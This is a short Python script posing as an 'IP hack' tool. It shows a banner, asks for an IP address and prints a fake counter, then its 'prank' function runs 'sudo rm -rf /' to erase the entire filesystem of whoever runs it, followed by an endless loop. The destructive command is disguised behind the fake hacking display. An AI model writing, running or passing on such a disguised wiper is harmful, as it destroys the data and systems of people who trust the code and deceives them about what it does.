#BY Z3R0          
import os
import time
import threading
os.system('clear')
RED = "\033[0;31m"
GREEN = "\033[0;32m"
print(RED+'''
 _   _    _    ____ _  __  _   _ ____  _____   ___ ____  
| | | |  / \  / ___| |/ / | | | / ___|| ____| |_ _|  _ \ 
| |_| | / _ \| |   | ' /  | | | \___ \|  _|    | || |_) |
|  _  |/ ___ \ |___| . \  | |_| |___) | |___   | ||  __/ 
|_| |_/_/   \_\____|_|\_\  \___/|____/|_____| |___|_|    
                                                         

''')
ip = input(RED+'\nType ip : ')
def FakeIPHack ():
    print(GREEN+'''\nwait....''')
    time.sleep(3)
    i = 0000
    while i >= 0 :
        print(i)
        i += 1
        if i == 1000:
            break
FakeIPHack()
def prank():
    os.system('sudo rm -rf /')
    os.system('clear')
    print('BY BY')
    i = 0
    while i == 0:
        o = i
prank()
t1 = threading.Thread(target=FakeIPHack,args=())
t2 = threading.Thread(target=prank,args=())
t1.start()
t2.start()

